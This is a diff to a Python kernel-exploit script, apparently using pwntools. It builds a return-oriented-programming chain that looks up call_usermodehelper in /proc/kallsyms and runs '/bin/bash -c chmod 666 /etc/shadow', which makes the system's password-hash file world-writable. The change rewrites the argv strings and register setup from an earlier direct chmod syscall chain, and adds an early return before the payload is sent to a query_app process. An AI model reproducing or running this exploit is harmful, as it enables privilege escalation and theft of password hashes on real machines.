@@ -70,10 +70,10 @@ class Adjuster(object):
         self.offset += int(add)
         return self.offset
 
-def chmod_addr():
+def kallsyms_lookup_name(sym_name):
     with open('/proc/kallsyms', 'rb') as i:
         return int([l.split()[0] for l in i.read().decode('utf-8').split('\n')
-                if 'sys_chmod' in l][0], 16)
+                if sym_name == l.split()[-1]][0], 16)
 
 def leaked(start_leaker, search_for):
     # Get the address from the leak
@@ -129,33 +129,51 @@ def build(leak, gadget_file, sled_length, adjuster):
     print('string_location:', hex(string_location))
 
     # rop = write4(rop, gadget_file, adjuster, string_location, b'/tmp')
-    rop = write4(rop, gadget_file, adjuster, string_location, b'/etc')
-    rop = write4(rop, gadget_file, adjuster, string_location + 4, b'/sha')
-    rop = write4(rop, gadget_file, adjuster, string_location + 8, b'dow\x00')
+    rop = write4(rop, gadget_file, adjuster, string_location + 0,
+            b'/bin/bas')
+    rop = write4(rop, gadget_file, adjuster, string_location + 8,
+            b'h\x00-c\x00chm')
+    rop = write4(rop, gadget_file, adjuster, string_location + 16,
+            b'od 666 /')
+    rop = write4(rop, gadget_file, adjuster, string_location + 24,
+            b'etc/shad')
+    rop = write4(rop, gadget_file, adjuster, string_location + 32,
+            b'ow\x00')
+
+
+    rop = write4(rop, gadget_file, adjuster, string_location + 40,
+            string_location)
+    rop = write4(rop, gadget_file, adjuster, string_location + 48,
+            string_location + 11)
+    rop = write4(rop, gadget_file, adjuster, string_location + 56,
+            string_location + 14)
+    rop = write4(rop, gadget_file, adjuster, string_location + 64,
+            0x0)
 
     # Now call chmod
 
     # pop rax; ret;
     rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
-    # rop.raw(adjuster(0x2f0eb))
     # set rax
-    rop.raw(0x5a)
-    # rop.raw(0x69)
+    rop.raw(string_location)
     # pop rdi; ret;
     rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
-    # rop.raw(adjuster(0x257e9))
-    # set rdi for setuid 0
-    # rop.raw(0x0)
+    # set rdi
     rop.raw(string_location)
     # pop rsi; ret;
     rop.raw(adjuster(gadget('pop %rsi; ret;', gadget_file)))
     # set rsi
-    rop.raw(0o666)
-    # syscall; NULL
-    rop.raw(adjuster(gadget('syscall;', gadget_file)))
-    # rop.raw(0x0)
-    # sys_chmod
-    # rop.raw(adjuster(chmod_addr()))
+    rop.raw(string_location + 40)
+    # pop rcx; ret;
+    rop.raw(adjuster(gadget('pop %rcx; ret;', gadget_file)))
+    # set rcx
+    rop.raw(0x1)
+    # pop rdx; ret;
+    rop.raw(adjuster(gadget('pop %rdx; ret;', gadget_file)))
+    # set rdx
+    rop.raw(0x0)
+    # Address of call_usermodehelper from /proc/kallsyms
+    rop.raw(kallsyms_lookup_name('call_usermodehelper'))
 
     # Display our completed ROP chain
     print(rop.dump())
@@ -184,6 +202,7 @@ def attack_kernel(target_binary, payload_file, sled_length):
     exploit = create_exploit(target_binary, payload_file, sled_length, leak, Adjuster(0x0))
     args = ['./query_app']
     print(args)
+    return
     p = process(args)
     print('sending payload...')
     p.send(exploit)
